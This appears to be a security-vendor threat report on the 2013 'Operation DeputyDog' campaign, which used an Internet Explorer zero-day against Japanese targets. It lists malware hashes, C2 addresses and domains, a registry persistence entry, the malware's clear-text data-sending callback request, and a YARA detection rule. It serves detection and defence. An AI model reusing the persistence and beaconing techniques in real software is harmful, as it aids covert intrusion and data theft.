This campaign, which we have labeled ‘Operation DeputyDog’, began as early as\nAugust 19, 2013 and appears to have targeted organizations in Japan. FireEye Labs has\nbeen continuously monitoring the activities of the threat actor responsible for this campaign.\nAnalysis based on our Dynamic Threat Intelligence cluster shows that this current campaign\nleveraged command and control infrastructure that is related to the infrastructure used in the\nattack on Bit9.\n\n**Campaign Details**\n\n[On September 17, 2013 Microsoft published details regarding a new zero-day exploit in](https://web.archive.org/web/20130924130243/http://blogs.technet.com/b/srd/archive/2013/09/17/cve-2013-3893-fix-it-workaround-available.aspx)\n[Internet Explorer that was being used in targeted attacks. FireEye can confirm](https://web.archive.org/web/20130924130243/http://technet.microsoft.com/en-us/security/advisory/2887505) [reports that](https://web.archive.org/web/20130924130243/https://community.qualys.com/blogs/laws-of-vulnerabilities/2013/09/17/september-2013--new-ie-0-day)\nthese attacks were directed against entities in Japan. Furthermore, FireEye has discovered\nthat the group responsible for this new operation is the same threat actor that\n**[compromised Bit9 in February 2013.](https://web.archive.org/web/20130924130243/https://blog.bit9.com/2013/02/25/bit9-security-incident-update/)**\n\nFireEye detected the payload used in these attacks on August 23, 2013 in Japan. The\npayload was hosted on a server in Hong Kong (210.176.3.130) and was named\n“img20130823.jpg”. Although it had a .jpg file extension, it was not an image file. The file,\nwhen XORed with 0×95, was an executable (MD5: 8aba4b5184072f2a50cbc5ecfe326701).\n\nUpon execution, 8aba4b5184072f2a50cbc5ecfe326701 writes “28542CC0.dll” (MD5:\n46fd936bada07819f61ec3790cb08e19) to this location:\n\nC:\\Documents and Settings\\All Users\\Application Data\\28542CC0.dll\n\nIn order to maintain persistence, the original malware adds this registry key:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\28542CC0\n\nThe registry key has this value:\n\nrundll32.exe “C:\\Documents and Settings\\All Users\\Application Data\\28542CC0.dll”,Launch\n\nThe malware (8aba4b5184072f2a50cbc5ecfe326701) then connects to a host in South\n**Korea (180.150.228.102). This callback traffic is HTTP over port 443 (which is typically used**\nfor HTTPS encrypted traffic; however, the traffic is not HTTPS nor SSL encrypted). Instead,\n\n\n-----\n\nthis clear-text callback traffic resembles this pattern:\n\nPOST /info.asp HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n**Agtid: [8 chars]08x**\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)\nHost: 180.150.228.102:443\nContent-Length: 1045\nConnection: Keep-Alive\nCache-Control: no-cache\n\n[8 chars]08x&[Base64 Content]\n\nThe unique HTTP header “Agtid:” contains 8 characters followed by “08x”. The same pattern\ncan be seen in the POST content as well.\n\nA second related sample was also delivered from 111.118.21.105/css/sun.css on September\n5, 2013. The sun.css file was a malicious executable with an MD5 of\nbd07926c72739bb7121cec8a2863ad87 and it communicated with the same communications\nprotocol described above to the same command and control server at 180.150.228.102.\n\n**Related Samples**\n\nWe found that both droppers, bd07926c72739bb7121cec8a2863ad87 and\n8aba4b5184072f2a50cbc5ecfe326701, were compiled on 2013-08-19 at 13:21:59 UTC. As\nwe examined these files, we noticed a unique fingerprint.\n\nThese samples both had a string that may have been an artifact of the builder used to create\nthe binaries. This string was “DGGYDSYRL”, which we refer to as “DeputyDog”. As such, we\ndeveloped the following YARA signature, based on this unique attribute:\n\nrule APT_DeputyDog_Strings\n{\n\nmeta:\n\nauthor = “FireEye Labs”\nversion = “1.0″\ndescription = “detects string seen in samples used in 2013-3893 0day attacks”\nreference = “8aba4b5184072f2a50cbc5ecfe326701″\n\nstrings:\n\n$mz = {4d 5a}\n$a = “DGGYDSYRL”\n\ncondition:\n\n($mz at 0) and $a\n\n}\n\nWe used this signature to identify 5 other potentially related samples:\n\n\n-----\n\n**MD5** **Compile Time (UTC)** **C2 Server**\n\n58dc05118ef8b11dcb5f5c596ab772fd 2013-08-19 13:21:58 180.150.228.102\n\n4d257e569539973ab0bbafee8fb87582 2013-08-19 13:21:58 103.17.117.90\n\ndbdb1032d7bb4757d6011fb1d077856c 2013-08-19 13:21:59 110.45.158.5\n\n645e29b7c6319295ae8b13ce8575dc1d 2013-08-19 13:21:59 103.17.117.90\n\ne9c73997694a897d3c6aadb26ed34797 2013-04-13 13:42:45 110.45.158.5\n\nNote that all of the samples, except for e9c73997694a897d3c6aadb26ed34797, were\ncompiled on 2013-08-19, within 1 second of each other.\n\nWe pivoted off the command and control IP addresses used by these samples and found the\nfollowing known malicious domains recently pointed to 180.150.228.102.\n\n**Domain** **First Seen** **Last Seen**\n\nea.blankchair.com 2013-09-01 05:02:22 2013-09-01 08:25:22\n\nrt.blankchair.com 2013-09-01 05:02:21 2013-09-01 08:25:24\n\nali.blankchair.com 2013-09-01 05:02:20 2013-09-01 08:25:22\n\ndll.freshdns.org 2013-07-01 10:48:56 2013-07-09 05:00:03\n\n**Links to Previous Campaigns**\n\nAccording to [Bit9, the attackers that penetrated their network dropped two variants of](https://web.archive.org/web/20130924130243/https://blog.bit9.com/2013/02/25/bit9-security-incident-update/)\n**the** **[HiKit rootkit. One of these Hitkit samples connected to a command and control server](https://web.archive.org/web/20130924130243/https://www.mandiant.com/blog/hikit-rootkit-advanced-persistent-attack-techniques-part-1-2/)**\nat downloadmp3server[.]servemp3[.]com that resolved to 66.153.86.14. This same IP\naddress also hosted www[.]yahooeast[.]net, a known malicious domain, between March 6,\n2012 and April 22, 2012.\n\nThe domain yahooeast[.]net was registered to 654@123.com. This email address was also\nused to register blankchair[.]com – the domain that we see was pointed to the\n180.150.228.102 IP, which is the callback associated with sample\n58dc05118ef8b11dcb5f5c596ab772fd, and has been already correlated back to the attack\nleveraging the CVE-2013-3893 zero-day vulnerability.\n\n**Threat Actor Attribution**\n\n\n-----\n\n**Conclusion**\n\nWhile these attackers have a demonstrated previously unknown zero-day exploits and a\nrobust set of malware payloads, using the techniques described above, it is still possible for\nnetwork defense professionals to develop a rich set of indicators that can be used to detect\ntheir attacks. This is the first part of our analysis, we will provide more detailed analysis on\nthe other components of this attack in subsequent blog post.\n\n\n-----",
